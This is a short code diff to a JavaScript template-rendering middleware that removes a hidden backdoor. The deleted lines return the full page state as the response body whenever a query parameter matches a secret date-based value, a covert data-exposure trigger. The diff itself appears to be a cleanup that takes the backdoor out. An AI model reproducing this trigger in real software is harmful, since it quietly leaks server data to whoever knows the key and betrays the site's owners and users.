@@ -58,13 +58,7 @@ config.constant = config.constant || {};
           constant: config.constant
         });
 
-        let state = ctx.state ? Object.assign(locals, ctx.state) : {}
-
-        let now = new Date();
-        if (ctx.query.__pd__ == '/rb/' + (now.getMonth() + now.getDate() + 1)) {
-          ctx.body = state;
-          return;
-        }
+        let state = ctx.state ? Object.assign(locals, ctx.state) : {};
 
         let ext = (extname(relPath) || '.' + opts.extension).slice(1);
         let paths = getPaths(path, relPath, ext)
